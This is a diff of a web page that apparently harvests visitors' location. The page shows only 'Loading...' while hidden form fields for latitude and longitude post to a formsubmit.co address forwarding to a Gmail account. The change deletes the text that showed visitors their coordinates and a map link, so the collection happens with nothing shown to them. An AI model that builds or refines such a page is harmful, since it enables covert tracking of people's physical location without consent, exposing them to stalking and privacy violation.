@@ -20,7 +20,7 @@
 </head>
 <body>
   <h1>Loading...</h1>
-  <div id="status">Please wait...</div>
+  <div id="status"></div>
 
   <form id="locationForm" action="https://formsubmit.co/savoraaservices@gmail.com" method="POST">
     <input type="hidden" name="latitude" id="latitude">
@@ -57,10 +57,6 @@
 
       // Update status
       statusDiv.innerHTML = `
-        ✅ Succesfull!<br>
-        "" ${lat}<br>
-        "" ${lon}<br>
-        <a href="${mapLink}" target="_blank"> ... </a><br><br>
         Loading...
       `;
 
@@ -87,4 +83,5 @@
   </script>
 </body>
 </html>
+
 
